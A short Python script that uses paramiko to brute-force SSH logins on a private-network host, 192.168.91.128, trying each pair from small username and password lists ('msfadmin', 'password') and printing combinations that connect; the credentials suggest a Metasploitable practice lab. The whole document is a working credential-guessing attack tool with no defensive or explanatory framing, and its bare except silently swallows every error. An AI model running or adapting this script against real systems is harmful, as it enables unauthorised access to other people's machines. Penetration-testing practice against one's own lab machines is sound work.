import paramiko
client=paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
username_list=["msfadmin","password"]
password_list=["msfadmin","password"]
for i in username_list:
    for j in password_list:
        try:
            sonuc=client.connect('192.168.91.128',username=i,password=j)
            client.close()
            print("Username: ",i,"Password: ",j)
        except:
            pass